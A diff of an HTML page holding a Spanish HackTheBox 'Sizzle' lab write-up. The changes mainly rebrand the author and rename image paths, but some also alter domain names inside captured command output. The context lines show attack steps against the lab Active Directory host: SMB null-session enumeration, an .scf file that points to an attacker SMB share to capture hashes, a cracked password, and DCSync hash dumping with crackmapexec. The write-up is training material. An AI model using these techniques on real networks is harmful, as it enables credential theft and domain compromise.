@@ -9,7 +9,7 @@
   <title>Writeup HackTheBox Sizzle</title>
 
   <meta name="description" content="Resolución de la máquina Sizzle de la plataforma de HackTheBox">
-  <meta name="author" content="GatoGamer1155">
+  <meta name="author" content="xchg2pwn">
   <meta name="HandheldFriendly" content="True">
   <meta name="MobileOptimized" content="320">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -18,17 +18,17 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Writeup HackTheBox Sizzle">
   <meta name="twitter:description" content="Resolución de la máquina Sizzle de la plataforma de HackTheBox">
-  <meta name="twitter:creator" content="GatoGamer1155">  
-  <meta name="twitter:image" content="/images/htb/sizzle.png" />
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/hackthebox/sizzle.png" />
 
-  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:site_name" content="xchg2pwn" />
   <meta property="og:type" content="article">
   <meta property="og:title" content="Writeup HackTheBox Sizzle">
   <meta property="og:description" content="Resolución de la máquina Sizzle de la plataforma de HackTheBox">
-  <meta property="og:image" content="/images/htb/sizzle.png" />
+  <meta property="og:image" content="/images/hackthebox/sizzle.png" />
 
   <link rel="manifest" href="/images/favicons/manifest.json">
-  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/sizzle.png">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/sizzle.png">
 
   <meta name="msapplication-TileColor" content="#ffc40d">
   <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
@@ -55,17 +55,17 @@
     <div class="panel-main__inner panel-inverted">
       <div class="panel-main__content">
 
-          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
-          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
 
         <hr class="panel-cover__divider">
-        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
         <hr class="panel-cover__divider panel-cover__divider--secondary">
 
         <div class="navigation-wrapper">
          <nav class="cover-navigation cover-navigation--primary">
             <ul class="navigation">
-              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+              <li class="navigation__item grow"><a href="/hackthebox" title="xchg2pwn" class="blog-button">HackTheBox</a></li>
             </ul>
           </nav>
 
@@ -73,35 +73,35 @@
             <ul class="navigation">
               
               <li class="navigation__item grow">
-                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                   <i class="icon icon-social-github"></i>
                   <span class="label">GitHub</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                   <i class="icon icon-social-twitter"></i>
                   <span class="label">Twitter</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                   <i class="icon icon-social-instagram"></i>
                   <span class="label">Instagram</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                   <i class="icon icon-social-youtube"></i>
                   <span class="label">Youtube</span>
                 </a>
               </li>
 
               <li class="navigation__item grow">
-                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                   <i class="icon icon-mail"></i>
                   <span class="label">Email</span>
                 </a>
@@ -138,7 +138,7 @@
 
   <header class="post-header slide-top">
     <h4 class="post-title">HackTheBox</h4>
-    <picture><img src="/images/htb/sizzle.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <picture><img src="/images/hackthebox/sizzle.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
     <h2 class="post-title">Sizzle</h2><br>
   </header>
   
@@ -209,7 +209,7 @@ ftp></span>
 </code></pre></div></div><br>
 
 <p class="plain-text">La página web principal tampoco nos aporta nada, solo es un <code class="language-plaintext highlighter-rouge">gif</code> sin mucho sentido</p>
-<a href="/htb/sizzle/1.png" target="_blank"><div><p><img src="/htb/sizzle/1.png"></p></div></a>
+<a href="/hackthebox/sizzle/1.png" target="_blank"><div><p><img src="/hackthebox/sizzle/1.png"></p></div></a>
 
 <p class="plain-text">Enumerando recursos <code class="language-plaintext highlighter-rouge">smb</code> compartidos desde una sesion nula tenemos privilegios <code class="language-plaintext highlighter-rouge">READ</code> o de lectura en el recurso <code class="language-plaintext highlighter-rouge">Department Shares</code> que no viene por defecto</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -341,7 +341,7 @@ drw-rw-rw-          0  Wed Sep 26 00:45:32 2018 Public
 
 <p class="plain-text">Con <code class="language-plaintext highlighter-rouge">smbcacls</code> podemos ver los privilegios exactos que tenemos sobre cada carpeta del recurso compartido, especificamente nos interesa el campo <code class="language-plaintext highlighter-rouge">Everyone</code> ya que son los privilegios que tenemos desde la <code class="language-plaintext highlighter-rouge">null</code> session en el contexto en que estamos</o>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ smbcacls </span><span class="p">-N </span><span class="am">"//htb.local/Department Shares" "Users/amanda"</span><span class="p">
+<code><span class="ve">❯ smbcacls </span><span class="p">-N </span><span class="am">"//hackthebox.local/Department Shares" "Users/amanda"</span><span class="p">
 REVISION:1
 CONTROL:SR|DI|DP
 OWNER:BUILTIN\Administrators
@@ -354,7 +354,7 @@ ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL</span>
 
 <p class="plain-text">A traves de un <code class="language-plaintext highlighter-rouge">bucle</code> iterando por cada uno de los directorios de usuario podemos revisar los privilegios de <code class="language-plaintext highlighter-rouge">Everyone</code>, en la carpeta <code class="language-plaintext highlighter-rouge">Public</code> tenemos privilegio <code class="language-plaintext highlighter-rouge">FULL</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ </span><span class="am">for </span><span class="p">user in </span><span class="sa">$(</span><span class="ve">cat </span><span class="p">users.txt</span><span class="sa">)</span><span class="p">; </span><span class="am">do </span><span class="ve">echo</span><span class="p"> -n </span><span class="am">"Users/</span><span class="az">$user</span><span class="am">: "</span><span class="p">; </span><span class="ve">smbcacls</span><span class="p"> -N </span><span class="am">"//htb.local/Department Shares" "Users/</span><span class="az">$user</span><span class="am">"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">Everyone; </span><span class="am">done</span><span class="p">  
+<code><span class="ve">❯ </span><span class="am">for </span><span class="p">user in </span><span class="sa">$(</span><span class="ve">cat </span><span class="p">users.txt</span><span class="sa">)</span><span class="p">; </span><span class="am">do </span><span class="ve">echo</span><span class="p"> -n </span><span class="am">"Users/</span><span class="az">$user</span><span class="am">: "</span><span class="p">; </span><span class="ve">smbcacls</span><span class="p"> -N </span><span class="am">"//hackthebox.local/Department Shares" "Users/</span><span class="az">$user</span><span class="am">"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">Everyone; </span><span class="am">done</span><span class="p">  
 Users/amanda: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
 Users/amanda_adm: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
 Users/bill: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
@@ -369,7 +369,7 @@ Users/mrb3n: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED
 Users/Public: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI/FULL</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Un posible ataque como en <a href="/htb/driver/">Driver</a> es cargar un archivo <code class="language-plaintext highlighter-rouge">scf</code> para cuando un usuario intente ver el <code class="language-plaintext highlighter-rouge">icono</code> este se carge de un recurso <code class="language-plaintext highlighter-rouge">smb</code> externo que crearemos</p>
+<p class="plain-text">Un posible ataque como en <a href="/hackthebox/driver/">Driver</a> es cargar un archivo <code class="language-plaintext highlighter-rouge">scf</code> para cuando un usuario intente ver el <code class="language-plaintext highlighter-rouge">icono</code> este se carge de un recurso <code class="language-plaintext highlighter-rouge">smb</code> externo que crearemos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">[</span><span class="na">Shell</span><span class="p">]
 </span><span class="o">IconFile</span><span class="p">=</span><span class="s">\\10.10.14.10\kali\pwned.ico  </span>
@@ -437,7 +437,7 @@ Session completed.</span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ crackmapexec </span><span class="p">winrm htb.local -u amanda -p Ashare1972 
 </span><span class="az">SMB         </span><span class="p">htb.local       5986   SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
-</span><span class="az">HTTP        </span><span class="p">htb.local       5986   SIZZLE           </span><span class="az">[*] </span><span class="p">https://htb.local:5986/wsman
+</span><span class="az">HTTP        </span><span class="p">htb.local       5986   SIZZLE           </span><span class="az">[*] </span><span class="p">https://hackthebox.local:5986/wsman
 </span><span class="az">WINRM       </span><span class="p">htb.local       5986   SIZZLE           </span><span class="ro">[-] </span><span class="p">HTB.LOCAL\amanda:Ashare1972 "The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"</span>  
 </code></pre></div></div><br>
 
@@ -568,7 +568,7 @@ PS C:\Users\amanda\Documents></span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Despues de subir el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code> tenemos diferentes querys que podemos utilizar, al listar los usuarios kerberoasteables podemos encontrar a <code class="language-plaintext highlighter-rouge">mrlky</code></p>
-<a href="/htb/sizzle/9.png" target="_blank"><div><p><img src="/htb/sizzle/9.png"></p></div></a>
+<a href="/hackthebox/sizzle/9.png" target="_blank"><div><p><img src="/hackthebox/sizzle/9.png"></p></div></a>
 
 <p class="plain-text">Tenemos otra limitación y es que aunque el puerto de kerberos que es el <code class="language-plaintext highlighter-rouge">88</code> esta abierto no podemos verlo desde el exterior y lo necesitamos para poder avanzar</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -731,7 +731,7 @@ PS C:\Users\mrlky\Documents></span>
 <br><h3 class="post-title">Shell - Administrator</h3><br>
 
 <p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">bloodhound</code> encontramos que el usuario <code class="language-plaintext highlighter-rouge">mrlky</code> tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> sobre el dominio por lo que podemos dumpear los hashes del <code class="language-plaintext highlighter-rouge">ntds.dit</code></p>
-<a href="/htb/sizzle/10.png" target="_blank"><div><p><img src="/htb/sizzle/10.png"></p></div></a>
+<a href="/hackthebox/sizzle/10.png" target="_blank"><div><p><img src="/hackthebox/sizzle/10.png"></p></div></a>
 
 <p class="plain-text">Para explotarlo podemos hacerlo facilmente usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> usando <code class="language-plaintext highlighter-rouge">--ntds</code> y con <code class="language-plaintext highlighter-rouge">drsuapi</code> como metodo, asi obtenemos todos los hashes <code class="language-plaintext highlighter-rouge">NT</code> del dominio</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1239,7 +1239,7 @@ C:\Windows\system32></span>
 </article>
   </div>
   <footer class="footer">
-    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
   </footer><br><br>
 
 <script type="text/javascript" src="/js/jquery.min.js"></script>
